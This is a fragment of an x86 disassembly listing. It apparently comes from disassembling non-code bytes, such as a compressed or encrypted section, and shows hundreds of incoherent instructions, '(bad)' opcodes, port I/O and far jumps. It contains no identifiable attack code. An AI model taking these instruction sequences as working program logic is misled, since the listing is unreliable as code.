  41b454:	lock mov ch,0xb
  41b457:	fild   WORD PTR [esi-0x5ddd6411]
  41b45e:	repz es dec ebp
  41b461:	jno    0x41b409
  41b463:	push   0x5f9f1f99
  41b468:	loope  0x41b3f3
  41b46a:	xlat   BYTE PTR ds:[ebx]
  41b46b:	add    eax,0xe17d7b13
  41b470:	ins    BYTE PTR es:[edi],dx
  41b471:	push   edx
  41b472:	leave  
  41b473:	sbb    eax,DWORD PTR [ebx-0x28]
  41b476:	ficomp DWORD PTR [ecx]
  41b478:	push   es
  41b479:	xchg   edi,eax
  41b47a:	fs call 0xa556917
  41b480:	clc    
  41b481:	ffree  st(3)
  41b483:	push   ds
  41b484:	adc    DWORD PTR [ebp+0x4d],ebp
  41b487:	and    al,0x20
  41b489:	add    DWORD PTR [edx],eax
  41b48b:	jmp    0x3ad3:0x4a64dfe4
  41b492:	or     esp,eax
  41b494:	stos   BYTE PTR es:[edi],al
  41b495:	adc    dl,BYTE PTR [eax]
  41b497:	mov    ds:0xa0af8da9,al
  41b49c:	hlt    
  41b49d:	dec    esp
  41b49e:	mov    ds:0x8c795c9c,al
  41b4a3:	push   ecx
  41b4a4:	not    DWORD PTR [esi]
  41b4a6:	arpl   sp,bx
  41b4a8:	mov    ch,0x97
  41b4aa:	or     DWORD PTR [ecx-0x2b08ed96],edi
  41b4b0:	jae    0x41b4b0
  41b4b2:	push   edx
  41b4b3:	sub    BYTE PTR [edx+eax*2+0x71],ch
  41b4b7:	out    dx,eax
  41b4b8:	test   edi,ecx
  41b4ba:	dec    esi
  41b4bb:	pushf  
  41b4bc:	(bad)  
  41b4bd:	jge    0x41b44e
  41b4bf:	adc    dl,ch
  41b4c1:	pop    ebx
  41b4c2:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b4c4:	mov    eax,ds:0xa085284
  41b4c9:	(bad)  
  41b4ca:	dec    ebp
  41b4cb:	push   ebp
  41b4cc:	push   ebx
  41b4cd:	into   
  41b4ce:	repnz xchg edi,eax
  41b4d0:	jecxz  0x41b45d
  41b4d2:	(bad)
  41b4d5:	outs   dx,BYTE PTR ds:[esi]
  41b4d6:	les    eax,FWORD PTR [esi+0x7bba185c]
  41b4dc:	pop    esi
  41b4dd:	stos   BYTE PTR es:[edi],al
  41b4de:	test   DWORD PTR [ebx+0x216bc74e],ebx
  41b4e4:	inc    eax
  41b4e5:	cld    
  41b4e6:	mov    esp,0xe43301bf
  41b4eb:	mov    eax,ds:0x468b6111
  41b4f0:	retf   0xc562
  41b4f3:	outs   dx,DWORD PTR ds:[esi]
  41b4f4:	je     0x41b4b3
  41b4f6:	ret    0xe204
  41b4f9:	mov    al,ds:0x91007b70
  41b4fe:	aam    0x2f
  41b500:	dec    DWORD PTR [eax*1-0x503e7b6]
  41b507:	ret    
  41b508:	(bad)  [esi-0x663a2698]
  41b50e:	js     0x41b586
  41b510:	js     0x41b4d9
  41b512:	stos   DWORD PTR es:[edi],eax
  41b513:	mov    ch,0xc3
  41b515:	dec    esp
  41b516:	xor    al,0xe
  41b518:	mov    ecx,0x692fbe4f
  41b51d:	aas    
  41b51e:	mov    eax,ds:0xd355dac7
  41b523:	jecxz  0x41b570
  41b525:	jo     0x41b4ab
  41b527:	push   DWORD PTR [ecx+0x6]
  41b52a:	cdq    
  41b52b:	ins    BYTE PTR es:[edi],dx
  41b52c:	inc    DWORD PTR [esi-0x6e]
  41b52f:	inc    eax
  41b530:	mov    BYTE PTR [edi+eiz*4+0xe4d0ef2],0xe
  41b538:	adc    bh,BYTE PTR [edi-0x18]
  41b53b:	jmp    0x6c926b3c
  41b540:	sbb    edi,edx
  41b542:	pop    ecx
  41b543:	cmc    
  41b544:	in     al,0x67
  41b546:	fwait
  41b547:	mov    edx,0xc227b14c
  41b54c:	(bad)  
  41b54d:	out    0xde,eax
  41b54f:	push   ebp
  41b550:	and    al,BYTE PTR [eax]
  41b552:	test   DWORD PTR [eax],0xf5f3183e
  41b558:	fwait
  41b559:	xchg   ecx,eax
  41b55a:	leave  
  41b55b:	sub    ebx,DWORD PTR [ebx-0x6b]
  41b55e:	cs xchg ebx,eax
  41b560:	fucom  st(2)
  41b562:	fdivp  st(2),st
  41b564:	outs   dx,DWORD PTR ds:[esi]
  41b565:	push   eax
  41b566:	jbe    0x41b5d5
  41b568:	repz in eax,0x2b
  41b56b:	aaa    
  41b56c:	xlat   BYTE PTR ds:[ebx]
  41b56d:	xchg   BYTE PTR [ebp-0x93cbfad],ah
  41b573:	inc    edx
  41b574:	and    al,0x9b
  41b576:	cmp    eax,0xff40c812
  41b57b:	cmp    DWORD PTR [eax-0x5664267e],eax
  41b581:	iret   
  41b582:	les    ebp,FWORD PTR [edx]
  41b584:	and    dl,ah
  41b586:	pop    ebx
  41b587:	test   DWORD PTR [eax],esp
  41b589:	mov    WORD PTR [ebp-0x79318de2],fs
  41b58f:	retf   0x9359
  41b592:	push   esp
  41b593:	and    dl,BYTE PTR [esi-0x30]
  41b596:	dec    esp
  41b597:	dec    esp
  41b598:	xchg   edx,eax
  41b599:	ror    BYTE PTR [eax+ebp*2+0x6e22edee],cl
  41b5a0:	(bad)  
  41b5a1:	and    BYTE PTR [eax+eiz*1],ch
  41b5a4:	xor    esp,DWORD PTR [edi+0x1091a20f]
  41b5aa:	and    eax,0x73afde05
  41b5af:	in     eax,0xfd
  41b5b1:	inc    eax
  41b5b2:	inc    esp
  41b5b3:	xchg   esp,eax
  41b5b4:	je     0x41b5c2
  41b5b6:	int3   
  41b5b7:	jnp    0x41b58e
  41b5b9:	cs clc 
  41b5bb:	mov    ah,0x3b
  41b5bd:	(bad)  
  41b5be:	jl     0x41b57c
  41b5c0:	mov    dl,BYTE PTR [edi-0x67]
  41b5c3:	imul   edi,DWORD PTR [edx],0x279b0bd9
  41b5c9:	pop    edx
  41b5ca:	data16 into 
  41b5cc:	fdiv   DWORD PTR [eax+eax*4-0x112207f2]
  41b5d3:	push   esp
  41b5d4:	sub    bl,bh
  41b5d6:	rol    DWORD PTR [ecx-0x5e],cl
  41b5d9:	mov    edx,0xdffe3d8e
  41b5de:	js     0x41b5e4
  41b5e0:	rol    DWORD PTR ds:0xd0bb20e7,cl
  41b5e6:	jmp    edx
  41b5e8:	ja     0x41b608
  41b5ea:	push   edi
  41b5eb:	add    al,0x3d
  41b5ed:	(bad)  
  41b5ee:	pop    ebx
  41b5ef:	adc    DWORD PTR [eax-0x5e930009],ebp
  41b5f5:	int3   
  41b5f6:	dec    esi
  41b5f7:	jo     0x41b5d0
  41b5f9:	ins    BYTE PTR es:[edi],dx
  41b5fa:	mov    al,ds:0xaf1837f
  41b5ff:	hlt    
  41b600:	(bad)  [ebp-0x418ba133]
  41b606:	dec    edi
  41b607:	push   cs
  41b608:	imul   edx,DWORD PTR [ebp+0x5a],0x30663024
  41b60f:	aam    0x57
  41b611:	mov    ebp,0x859998fe
  41b616:	test   DWORD PTR [eax+0x34],ebp
  41b619:	lock addr16 push es
  41b61c:	and    ecx,DWORD PTR [ebp-0x1]
  41b61f:	out    0x9d,al
  41b621:	inc    edx
  41b622:	push   eax
  41b623:	push   ebp
  41b624:	out    0x86,al
  41b626:	pop    ebx
  41b627:	mov    ss:0x505f6ee3,al
  41b62d:	cmc    
  41b62e:	shr    DWORD PTR [ecx+0x3d],cl
  41b631:	adc    DWORD PTR [ecx+0xdbe70c7],0xdaeca946
  41b63b:	fimul  WORD PTR [edi-0x3a]
  41b63e:	jns    0x41b67b
  41b640:	mov    ecx,DWORD PTR [esi]
  41b642:	sub    BYTE PTR [edx],dl
  41b644:	push   es
  41b645:	dec    esi
  41b646:	lea    ebp,[eax-0x632e4420]
  41b64c:	xlat   BYTE PTR ds:[ebx]
  41b64d:	add    DWORD PTR [ecx-0x5f],edi
  41b650:	adc    ebx,esi
  41b652:	mov    al,ds:0x2cb12b82
  41b657:	inc    esp
  41b658:	xchg   edi,eax
  41b659:	std    
  41b65a:	cmp    BYTE PTR [edx],bh
  41b65c:	and    al,0xcb
  41b65e:	in     eax,dx
  41b65f:	cld    
  41b660:	add    BYTE PTR ss:[eax-0x21acc42f],bl
  41b667:	jp     0x41b6b3
  41b669:	sub    al,ch
  41b66b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b66c:	bound  edx,QWORD PTR [ebx+0x18]
  41b66f:	pop    ds
  41b670:	xor    DWORD PTR [eax],0xed860463
  41b676:	int    0xaf
  41b678:	fxrstor [edi]
  41b67b:	adc    DWORD PTR [edx],ebp
  41b67d:	xchg   edx,eax
  41b67e:	xor    BYTE PTR [esi+0x72],bh
  41b681:	ins    DWORD PTR es:[edi],dx
  41b682:	xchg   ebp,eax
  41b683:	in     eax,0xc4
  41b685:	and    bh,BYTE PTR [edi+esi*2+0x6ccc9d]
  41b68c:	data16 loopne 0x41b6e3
  41b68f:	xchg   edx,eax
  41b690:	mov    edi,ebx
  41b692:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b693:	add    eax,0xa7445bc6
  41b698:	xlat   BYTE PTR ds:[ebx]
  41b699:	xor    BYTE PTR [eax+0x393d1e96],cl
  41b69f:	fdivp  st(3),st
  41b6a1:	shr    BYTE PTR [edx+0x518f2897],1
  41b6a7:	adc    cl,BYTE PTR [eax+0x21a428f5]
  41b6ad:	pushf  
  41b6ae:	mov    ds:0xef052d9c,al
  41b6b3:	mov    esp,0x8db1827f
  41b6b8:	shl    BYTE PTR [ebx+ebp*8],1
  41b6bb:	cmp    DWORD PTR [ecx-0x5a],ebx
  41b6be:	xchg   edx,eax
  41b6bf:	rcl    DWORD PTR [ecx-0x54],cl
  41b6c2:	jecxz  0x41b693
  41b6c4:	mov    edx,0xdfb85e65
  41b6c9:	add    eax,0xdbafaa58
  41b6ce:	out    0xa6,al
  41b6d0:	shr    DWORD PTR [eax+0x2],0x4b
  41b6d4:	mov    cs,eax
  41b6d6:	repnz popfw 
  41b6d9:	pop    edi
  41b6da:	in     al,dx
  41b6db:	test   eax,0x80d95175
  41b6e0:	ss out dx,eax
  41b6e2:	mov    bl,0xcb
  41b6e4:	jb     0x41b6ca
  41b6e6:	xor    bl,cl
  41b6e8:	es std 
  41b6ea:	leave  
  41b6eb:	adc    bh,BYTE PTR [esi-0x69d04eac]
  41b6f1:	mov    bh,BYTE PTR [esi-0x60fa821]
  41b6f7:	ja     0x41b6e5
  41b6f9:	ds pop edi
  41b6fb:	dec    ebp
  41b6fc:	shl    BYTE PTR [edx-0x3274580e],1
  41b702:	inc    esi
  41b703:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b704:	arpl   cx,dx
  41b706:	into   
  41b707:	add    dh,ch
  41b709:	mov    eax,DWORD PTR [eax-0x7489b5b]
  41b70f:	mov    cl,0xf
  41b711:	jmp    0x4545405a
  41b716:	mov    esi,0xe96d83bb
  41b71b:	push   esi
  41b71c:	pop    ecx
  41b71d:	sbb    DWORD PTR [ecx],esp
  41b71f:	mov    ebp,0xdf10e1f4
  41b724:	pop    ebp
  41b725:	dec    edi
  41b726:	cld    
  41b727:	xor    ah,0x46
  41b72a:	stc    
  41b72b:	fcomp  st(4)
  41b72d:	pop    ebx
  41b72e:	mov    bh,0x79
  41b730:	cmp    BYTE PTR [eax],dl
  41b732:	aas    
  41b733:	cli    
  41b734:	and    al,0x3f
  41b736:	dec    eax
  41b737:	imul   esp,DWORD PTR [edx],0x51
  41b73a:	(bad)  
  41b73b:	jl     0x41b756
  41b73d:	pop    edx
  41b73e:	rcr    BYTE PTR [edx+0x1b604f55],cl
  41b744:	imul   ecx,DWORD PTR es:[edx+0x60585a05],0xcce18c9e
  41b74f:	adc    DWORD PTR [edi],ecx
  41b751:	stos   BYTE PTR es:[di],al
  41b753:	fimul  DWORD PTR [ebp+0x70]
  41b756:	xor    al,0xbf
  41b758:	fs js  0x41b740
  41b75b:	or     DWORD PTR [ecx-0x2f56af38],ecx
  41b761:	push   eax
  41b762:	nop
  41b763:	and    al,0xaf
  41b765:	inc    ebx
  41b766:	sub    ah,BYTE PTR [ebp+esi*8+0x25]
  41b76a:	jle    0x41b766
  41b76c:	xor    DWORD PTR [ebp+0x24237867],ecx
  41b772:	pop    esi
  41b773:	xor    al,0xe7
  41b775:	jae    0x41b7de
  41b777:	ds adc eax,ecx
  41b77a:	xor    ch,dl
  41b77c:	les    ebx,FWORD PTR [esi+ebp*8+0x15996b6f]
  41b783:	int3   
  41b784:	ins    DWORD PTR es:[edi],dx
  41b785:	stos   BYTE PTR es:[edi],al
  41b786:	add    ebp,DWORD PTR [ebp+ecx*1-0x3be2d692]
  41b78d:	scas   al,BYTE PTR es:[edi]
  41b78e:	jne    0x41b795
  41b790:	and    al,0x1
  41b792:	and    edi,0x1
  41b795:	pop    ss
  41b796:	cmp    al,0x3
  41b798:	add    BYTE PTR [edx],ch
  41b79a:	mov    ds:0xaa48fc8d,al
  41b79f:	leave  
  41b7a0:	dec    esp
  41b7a1:	loope  0x41b7a8
  41b7a3:	xchg   esp,eax
  41b7a4:	pop    eax
  41b7a5:	aaa    
  41b7a6:	pusha  
  41b7a7:	addr16 mov eax,ds:0x6079
  41b7ab:	aad    0x5b
  41b7ad:	in     eax,dx
  41b7ae:	cld    
  41b7af:	dec    edi
  41b7b0:	pusha  
  41b7b1:	mov    bl,0x17
  41b7b3:	mov    eax,0x8eaf390f
  41b7b8:	xor    al,0x55
  41b7ba:	push   ebp
  41b7bb:	mov    ds:0x8b28d33c,eax
  41b7c0:	mov    ds:0x9b70727b,eax
  41b7c5:	imul   ebp,edx,0x5d
  41b7c8:	call   0xe46e:0xb710eee0
  41b7cf:	pop    esi
  41b7d0:	or     dh,dh
  41b7d2:	inc    esi
  41b7d3:	idiv   dl
  41b7d5:	stc    
  41b7d6:	fadd   st(5),st
  41b7d8:	arpl   WORD PTR [esi+edi*2-0x2],si
  41b7dc:	lahf   
  41b7dd:	jno    0x41b809
  41b7df:	add    ecx,ecx
  41b7e1:	into   
  41b7e2:	out    0x6a,al
  41b7e4:	adc    al,0xb0
  41b7e6:	push   cs
  41b7e7:	xlat   BYTE PTR ds:[ebx]
  41b7e8:	int    0xb5
  41b7ea:	push   edi
  41b7eb:	xor    BYTE PTR ds:0x4466b9c1,dl
  41b7f1:	(bad)
  41b7f5:	dec    esi
  41b7f6:	mov    WORD PTR [esi+eiz*4+0x72],fs
  41b7fa:	pop    edi
  41b7fb:	mov    edx,0xec5e7b5d
  41b800:	mov    ebp,0xf3793367
  41b805:	je     0x41b7b6
  41b807:	outs   dx,BYTE PTR ds:[esi]
  41b808:	outs   dx,DWORD PTR ds:[esi]
  41b809:	loope  0x41b7a6
  41b80b:	aaa    
  41b80c:	fidivr WORD PTR [esi+esi*2-0x48]
  41b810:	cmp    BYTE PTR [edi],cl
  41b812:	pop    ebp
  41b813:	jg     0x41b878
  41b815:	stos   BYTE PTR es:[edi],al
  41b816:	in     al,dx
  41b817:	leave  
  41b818:	mov    dh,0x51
  41b81a:	fadd   DWORD PTR [ecx-0x63]
  41b81d:	out    0xe8,eax
  41b81f:	std    
  41b820:	aam    0xef
  41b822:	(bad)  
  41b823:	sub    BYTE PTR [ebp+0x38f8b1ad],al
  41b829:	pushf  
  41b82a:	rol    dh,0x73
  41b82d:	les    esi,FWORD PTR [edi+0x2e]
  41b830:	mov    BYTE PTR [ecx+edx*2+0x1f205de0],al
  41b837:	out    dx,eax
  41b838:	dec    ecx
  41b839:	push   esp
  41b83a:	xchg   esi,eax
  41b83b:	neg    BYTE PTR [ecx]
  41b83d:	aas    
  41b83e:	mov    ch,0x37
  41b840:	retf   
  41b841:	not    cl
  41b843:	test   al,0x12
  41b845:	jmp    0xc106:0xc1ad9254
  41b84c:	int3   
  41b84d:	sbb    ch,bh
  41b84f:	pop    ebp
  41b850:	fcom   QWORD PTR [eax+0x4]
  41b853:	dec    esi
  41b854:	aad    0xb0
  41b856:	fcom   QWORD PTR [ecx-0x4dabb6d1]
  41b85c:	in     al,0xe8
  41b85e:	ret    
  41b85f:	lods   al,BYTE PTR ds:[esi]
  41b861:	mov    ebp,0xfef05f42
  41b866:	neg    BYTE PTR [esi+0xdb66a73]
  41b86c:	sbb    cl,BYTE PTR [ebx+0x24]
  41b86f:	xchg   esi,eax
  41b870:	sti    
  41b871:	xchg   esi,eax
  41b872:	add    DWORD PTR [ebp+eiz*4-0x28],esp
  41b876:	xor    ebp,DWORD PTR [edi]
  41b878:	stos   DWORD PTR es:[edi],eax
  41b879:	jo     0x41b860
  41b87b:	pop    es
  41b87c:	(bad)  
  41b87d:	fld    DWORD PTR ds:0x5bca6ca
  41b883:	or     DWORD PTR [edx+esi*1],ebp
  41b886:	xor    BYTE PTR [ebx],bh
  41b888:	or     al,0xa9
  41b88a:	mov    ds:0x9b499543,al
  41b88f:	push   ss
  41b890:	(bad)  
  41b891:	sub    BYTE PTR ds:0xf01479a9,cl
  41b897:	and    BYTE PTR [edx+edi*1-0x1f5d2b08],al
  41b89e:	shl    BYTE PTR [ebp+0x2ef668f0],1
  41b8a4:	mov    bh,0x90
  41b8a6:	and    BYTE PTR [edi],0xd4
  41b8a9:	add    DWORD PTR [edi+eax*8-0x223d51c9],edx
  41b8b0:	ret    
  41b8b1:	mov    ch,0x3e
  41b8b3:	dec    eax
  41b8b4:	pop    ebp
  41b8b5:	xchg   edx,eax
  41b8b6:	mov    ah,al
  41b8b8:	push   ebx
  41b8b9:	xor    bl,BYTE PTR [ebp+eiz*2-0x5b]
  41b8bd:	push   esp
  41b8be:	ret    0x846a
  41b8c1:	push   0x70
  41b8c3:	ret    0xcd1c
  41b8c6:	leave  
  41b8c7:	sti    
  41b8c8:	adc    esi,DWORD PTR [edi*1+0x60135f1]
  41b8cf:	xor    BYTE PTR [ebx+0x18],ah
  41b8d2:	pop    eax
  41b8d3:	clc    
  41b8d4:	sahf   
  41b8d5:	add    DWORD PTR [edx+ebp*4-0x1c1255fe],ebx
  41b8dc:	popf   
  41b8dd:	mov    dh,BYTE PTR cs:[ecx+0x4a425ace]
  41b8e4:	and    ch,cl
  41b8e6:	mov    ah,0x9e
  41b8e8:	mov    al,0x49
  41b8ea:	je     0x41b870
  41b8ec:	repz les edi,FWORD PTR [esi]
  41b8ef:	dec    ecx
  41b8f0:	adc    eax,0xd4b1966b
  41b8f5:	lea    edx,[ebp+ebx*2-0x13]
  41b8f9:	fistp  DWORD PTR [esi+0x7c473e48]
  41b8ff:	lahf   
  41b900:	js     0x41b970
  41b902:	mov    cs,ebx
  41b904:	adc    BYTE PTR [esi-0xc2f1722],bl
  41b90a:	(bad)  
  41b90b:	aas    
  41b90c:	aad    0x38
  41b90e:	pop    es
  41b90f:	repnz (bad) 
  41b911:	in     al,0x87
  41b913:	popf   
  41b914:	pop    es
  41b915:	frstor [esi+0x5b]
  41b918:	sub    BYTE PTR [esi+0x10],cl
  41b91b:	fst    st(5)
  41b91d:	jg     0x41b980
  41b91f:	aad    0xae
  41b921:	add    al,0x7c
  41b923:	fwait
  41b924:	xor    BYTE PTR [edi],dl
  41b926:	sar    BYTE PTR [edx+edx*8-0xebc079f],0x2c
  41b92e:	cwde   
  41b92f:	sub    eax,0x61b6e9b7
  41b934:	jecxz  0x41b9ab
  41b936:	sbb    al,0x80
  41b938:	inc    edi
  41b939:	jae    0x41b935
  41b93b:	(bad)  
  41b93d:	inc    esp
  41b93e:	fsub   QWORD PTR [edi+0x5fd79e9]
  41b944:	dec    esp
  41b945:	in     al,dx
  41b946:	mov    eax,0xe31ac3fc
  41b94b:	xor    eax,0xe376710b
  41b950:	ds je  0x41b957
  41b953:	stos   DWORD PTR es:[edi],eax
  41b954:	mov    ebx,0x19350395
  41b959:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b95a:	sahf   
  41b95b:	lahf   
  41b95c:	jecxz  0x41b97f
  41b95e:	pushf  
  41b95f:	es adc eax,0xa84fe43c
  41b965:	cmp    al,0x36
  41b967:	inc    esp
  41b968:	xchg   ecx,eax
  41b969:	mov    bl,0xcd
  41b96b:	or     edi,DWORD PTR [ebx+0x418336d4]
  41b971:	pop    esp
  41b972:	mov    ah,0x95
  41b974:	(bad)  
  41b975:	rcl    DWORD PTR [edi-0x1a870c47],0xb6
  41b97c:	(bad)  
  41b97e:	test   DWORD PTR [ebp+0x688e5a78],eax
  41b984:	sbb    edi,ebp
  41b986:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b987:	lods   eax,DWORD PTR ds:[si]
  41b989:	xor    al,0x58
  41b98b:	xchg   al,al
  41b98d:	hlt    
  41b98e:	xchg   ebp,eax
  41b98f:	sbb    eax,0x2364d44b
  41b994:	mov    ch,0xa3
  41b996:	pop    ds
  41b997:	sar    cl,1
  41b999:	inc    ebp
  41b99a:	jmp    0x992f:0x6d429008
  41b9a1:	sub    al,0x99
  41b9a3:	sub    dh,BYTE PTR [ecx+0x8ce7c24]
  41b9a9:	mov    esi,0xd095e56f
  41b9ae:	fist   DWORD PTR [ebx+0x63]
  41b9b1:	mov    bh,0xca
  41b9b3:	or     BYTE PTR [edx-0x3d],ah
  41b9b6:	mov    al,0xc8
  41b9b8:	mov    ah,0xca
  41b9ba:	jnp    0x41b97f
  41b9bc:	adc    esp,DWORD PTR [ebp+0x617efe27]
  41b9c2:	es fwait
  41b9c4:	mov    esp,0x6d229532
  41b9c9:	sar    BYTE PTR [edx],1
  41b9cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b9cc:	mov    ds:0xe5c76bd4,eax
  41b9d1:	push   edi
  41b9d2:	mov    ebp,DWORD PTR [edx]
  41b9d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b9d5:	xlat   BYTE PTR ds:[ebx]
  41b9d6:	xor    al,BYTE PTR [esi+0xc618f33]
  41b9dc:	inc    edx
  41b9dd:	dec    edi
  41b9de:	cmp    eax,0xa5b23062
  41b9e3:	jge    0x41b966
  41b9e5:	and    DWORD PTR [esi+0x2a82ed70],ebx
  41b9eb:	fucomip st,st(1)
  41b9ed:	out    dx,eax
  41b9ee:	and    al,0x53
  41b9f0:	mov    eax,ds:0x74a78474
  41b9f5:	in     al,0x59
  41b9f7:	mov    WORD PTR [ecx],cs
  41b9f9:	push   ecx
  41b9fa:	lods   al,BYTE PTR ds:[esi]
  41b9fb:	push   es
  41b9fc:	outs   dx,DWORD PTR ds:[esi]
  41b9fd:	sbb    DWORD PTR [edx],ebx
  41b9ff:	jge    0x41ba1c
  41ba01:	pop    ebp
  41ba02:	dec    edi
  41ba03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ba04:	mov    al,ds:0x29463fe2
  41ba09:	or     al,0x48
  41ba0b:	stc    
  41ba0c:	pop    edx
  41ba0d:	aam    0x63
  41ba0f:	mov    cl,0xa3
  41ba11:	inc    edi
  41ba12:	inc    edi
  41ba13:	test   al,0x33
  41ba15:	sar    DWORD PTR [edi*8+0x18fc784b],0x2
  41ba1d:	in     eax,0x8b
  41ba1f:	mov    esi,0xf7c0d9e1
  41ba24:	rol    BYTE PTR [ebx],1
  41ba26:	lods   eax,DWORD PTR ds:[esi]
  41ba27:	dec    eax
  41ba28:	push   esp
  41ba29:	and    BYTE PTR [edi-0xf5c0273],0x4c
  41ba30:	jg     0x41ba91
  41ba32:	jmp    0x8392:0x33935486
  41ba39:	mov    edx,0xe46fc94
  41ba3e:	cmp    WORD PTR [esi],bx
  41ba41:	data16 cmc 
  41ba43:	int    0xdf
  41ba45:	and    ah,BYTE PTR [esi-0x30e2d553]
  41ba4b:	jns    0x41ba70
  41ba4d:	icebp  
  41ba4e:	das    
  41ba4f:	fnsave [eax+0x4d0711a4]
  41ba55:	jl     0x41ba57
  41ba57:	fsubr  QWORD PTR [eax]
  41ba59:	xchg   ecx,eax
  41ba5a:	xchg   DWORD PTR [edi+0x4a],edi
  41ba5d:	xor    DWORD PTR [edx],0xffffffc7
  41ba60:	inc    esi
  41ba61:	mov    edx,0xe24ff486
  41ba66:	mov    eax,ds:0x625c1459
  41ba6b:	into   
  41ba6c:	xchg   ebx,eax
  41ba6d:	inc    esi
  41ba6e:	je     0x41ba73
  41ba70:	push   edx
  41ba71:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ba72:	add    ah,BYTE PTR [ecx+0x39]
  41ba75:	dec    esi
  41ba76:	jae    0x41baf4
  41ba78:	fist   DWORD PTR [eax]
  41ba7a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ba7b:	(bad)  
  41ba7c:	xor    DWORD PTR [esi-0x30],esp
  41ba7f:	xor    al,0x81
  41ba81:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ba82:	jno    0x41ba1c
  41ba84:	ja     0x41baa8
  41ba86:	imul   edi,DWORD PTR [eax-0x11],0xfffffff7
  41ba8a:	and    eax,0xb56e7300
  41ba8f:	xchg   ebx,eax
  41ba90:	inc    esp
  41ba91:	outs   dx,BYTE PTR ds:[esi]
  41ba92:	dec    ecx
  41ba93:	(bad)
  41ba97:	scas   al,BYTE PTR es:[edi]
  41ba98:	jbe    0x41ba20
  41ba9a:	mov    BYTE PTR [eax*2+0x468c52c0],dh
  41baa1:	push   eax
  41baa2:	pop    es
  41baa3:	push   ds
  41baa4:	ss sti 
  41baa6:	jbe    0x41baf1
  41baa8:	aam    0x30
  41baaa:	in     eax,dx
  41baab:	or     eax,0x21dd44e8
  41bab0:	adc    ecx,DWORD PTR [edx-0x46]
  41bab3:	inc    ebp
  41bab4:	xor    al,0x4a
  41bab6:	pop    ss
  41bab7:	rcl    al,cl
  41bab9:	or     edx,DWORD PTR [esi]
  41babb:	mov    ebx,0xb2135737
  41bac0:	cmp    bl,bl
  41bac2:	push   di
  41bac4:	stos   DWORD PTR es:[edi],eax
  41bac5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bac6:	jno    0x41bac2
  41bac8:	scas   eax,DWORD PTR es:[edi]
  41bac9:	nop
  41baca:	inc    ecx
  41bacb:	popa   
  41bacc:	aad    0x58
  41bace:	cld    
  41bacf:	dec    esi
  41bad0:	fidiv  WORD PTR [esi-0x6da1ca11]
  41bad6:	jo     0x41bb10
  41bad8:	arpl   cx,bx
  41bada:	ins    BYTE PTR es:[edi],dx
  41badb:	cmp    DWORD PTR [edi-0x369072b1],ebx
  41bae1:	xor    ebp,ebp
  41bae3:	pop    edi
  41bae4:	xchg   ecx,eax
  41bae5:	mov    eax,0x59fcd581
  41baea:	mov    DWORD PTR [eax+0x2a5a1890],eax
  41baf0:	mov    esi,0x1dd9e48
  41baf5:	lods   eax,DWORD PTR ds:[esi]
  41baf6:	pop    ebp
  41baf7:	push   ss
  41baf8:	shl    ebx,0x27
  41bafb:	lock xor BYTE PTR [ecx],ah
  41bafe:	xchg   bh,al
  41bb00:	xor    al,0x30
  41bb02:	jl     0x41bb4d
  41bb04:	pop    ecx
  41bb05:	mov    bh,0x44
  41bb07:	pop    es
  41bb08:	lds    ebx,FWORD PTR [edx+0x576b2bca]
  41bb0e:	inc    eax
  41bb0f:	mov    bl,0xcf
  41bb11:	xor    dl,BYTE PTR [ebp+0x53]
  41bb14:	iret   
  41bb15:	mov    BYTE PTR [edx],dl
  41bb17:	outs   dx,BYTE PTR ds:[esi]
  41bb18:	fiadd  WORD PTR [edx]
  41bb1a:	(bad)  
  41bb1b:	adc    eax,0xa87dfce7
  41bb20:	imul   esi,DWORD PTR [edx],0xffffffd4
  41bb23:	push   edi
  41bb24:	dec    edi
  41bb25:	rcr    cl,0x48
  41bb28:	jnp    0x41babf
  41bb2a:	cmp    eax,0x88be2ff7
  41bb2f:	(bad)  [ebx]
  41bb31:	out    dx,eax
  41bb32:	sub    BYTE PTR [ecx],0x75
  41bb35:	outs   dx,DWORD PTR ds:[si]
  41bb37:	int    0x62
  41bb39:	sar    DWORD PTR [esi+eiz*2-0x43],1
  41bb3d:	out    0x47,eax
  41bb3f:	test   al,0x8d
  41bb41:	into   
  41bb42:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bb43:	pusha  
  41bb44:	and    eax,0x3229ac5
  41bb49:	fmul   st,st(1)
  41bb4b:	mov    ecx,0x97bd017c
  41bb50:	js     0x41bb37
  41bb52:	dec    BYTE PTR [ecx-0x31]
  41bb55:	inc    BYTE PTR [edx]
  41bb57:	pop    es
  41bb58:	cs pushf 
  41bb5a:	loope  0x41bb52
  41bb5c:	mov    esp,edx
  41bb5e:	mov    dh,0xf1
  41bb60:	sbb    cl,BYTE PTR [ecx]
  41bb62:	push   es
  41bb63:	mov    DWORD PTR [ebp+0x71],0x6a739435
  41bb6a:	adc    dl,BYTE PTR [ecx+0x3d]
  41bb6d:	dec    ebp
  41bb6e:	mov    edx,0x67337e12
  41bb73:	cdq    
  41bb74:	jge    0x41baff
  41bb76:	sbb    BYTE PTR [ebp+0x597c8aed],ah
  41bb7c:	mov    ah,0xed
  41bb7e:	ret    0xfabb
  41bb81:	push   eax
  41bb82:	inc    eax
  41bb83:	xor    DWORD PTR [ebp-0x7f],ecx
  41bb86:	pushf  
  41bb87:	sbb    BYTE PTR ds:0x734b5fc8,bh
  41bb8d:	inc    BYTE PTR [ebx+ebx*2]
  41bb90:	jecxz  0x41bbaa
  41bb92:	add    cl,BYTE PTR [ebx-0x5a]
  41bb95:	daa    
  41bb96:	aam    0x81
  41bb98:	cmp    BYTE PTR [esi+0x614726b2],bl
  41bb9e:	jl     0x41bbf6
  41bba0:	add    DWORD PTR [ebx-0x725c9bdb],edx
  41bba6:	stc    
  41bba7:	add    edx,DWORD PTR [edi]
  41bba9:	adc    eax,DWORD PTR [edi]
  41bbab:	mov    dl,al
  41bbad:	and    al,0xed
